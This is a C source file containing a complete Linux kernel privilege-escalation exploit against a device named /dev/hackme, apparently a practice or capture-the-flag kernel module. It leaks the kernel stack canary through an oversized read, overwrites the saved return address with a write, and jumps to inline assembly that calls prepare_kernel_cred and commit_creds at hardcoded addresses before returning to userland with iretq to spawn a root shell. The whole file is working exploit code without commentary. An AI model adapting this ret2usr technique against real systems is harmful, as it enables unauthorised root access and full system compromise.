#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <inttypes.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>

void open_dev(void);
int isCookie(unsigned long x);
void show_leaks(unsigned long *buf, int n);
void leak_cookie(void);
void write_ret(void);
void spawn_shell(void);
void save_state(void);
void privesc(void);

int devfd;
uint64_t cookie;
uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t user_rip = (uint64_t) spawn_shell;
uint64_t prepare_kernel_cred = 0xffffffff814c67f0;
uint64_t commit_creds = 0xffffffff814c6410;

void open_dev(void) {
  devfd = open("/dev/hackme", O_RDWR);
  if(devfd < 0) {
    puts("[!] Failed to open device...");
    exit(-1);
  }
  puts("[*] Opened device");
}

int isCookie(unsigned long x) {
  if(((x&0xff) == 0x00) && \
    ((x&0xffff000000000000) != 0xffff000000000000) && \
    (x>>(8*7+4)) > 0x00) {
    return 1;
  }
  return 0;
}

void show_leaks(unsigned long *buf, int n) {
  for(int i = 0; i < n; ++i) {
    printf("[*] Leak[%02d]: %lx\n", i, buf[i]);
    if(isCookie(buf[i])) {
      printf("----\n[+] Cookie FOUND @ idx=%02d --> %lx\n----\n", i, buf[i]);
    }
  }
}

void leak_cookie(void) {
  unsigned n = 20;
  uint64_t leak[n];
  ssize_t r = read(devfd, leak, sizeof(leak));
  //show_leaks(leak, n);
  printf("[*] Leaked %zd bytes\n", r);
  cookie = leak[16];
  if(cookie == 0x00) {
    puts("[!] Failed to leak stack cookie");
    exit(-1);
  }
  printf("----\n[+] Cookie FOUND: %lx\n----\n", cookie);
}

void write_ret(void) {
  uint8_t sz = 50;
  uint64_t payload[sz];
  uint8_t cookie_off = 16;
  payload[cookie_off++] = cookie;
  payload[cookie_off++] = 0x00; // rbx
  payload[cookie_off++] = 0x00; // r12
  payload[cookie_off++] = 0x00; // rbp
  //payload[cookie_off++] = (uint64_t)0xdeadbeef;
  payload[cookie_off++] = (uint64_t) privesc;
  ssize_t dat = write(devfd, payload, sizeof(payload));
  puts("----\n[!] Failed\n----");
}

void spawn_shell(void) {
  puts("[*] Hello from user land...");
  int uid = getuid();
  if(!uid) {
    printf("[+] UID: %d, got root!\n", uid);
  }
  else {
    printf("[!] UID: %d, NO root :|\n", uid);
    exit(-1);
  }
  system("/bin/sh");
}

void save_state(void) {
  __asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
  );
  puts("[+] Saved state");
}

void privesc(void) {
  __asm__(
    ".intel_syntax noprefix;"
    "movabs rax, prepare_kernel_cred;"
    "xor rdi, rdi;"
    "call rax; mov rdi, rax;"
    "movabs rax, commit_creds;"
    "call rax;"
    "swapgs;"
    "mov r15, user_ss;"
    "push r15;"
    "mov r15, user_sp;"
    "push r15;"
    "mov r15, user_rflags;"
    "push r15;"
    "mov r15, user_cs;"
    "push r15;"
    "mov r15, user_rip;"
    "push r15;"
    "iretq;"
    ".att_syntax;"
  );
}

int main(void) {
  puts("** Running Exploit **");
  open_dev();
  leak_cookie();
  save_state();
  write_ret();
  puts("----\n[!] Failed (main)\n----");
  return 0;
}
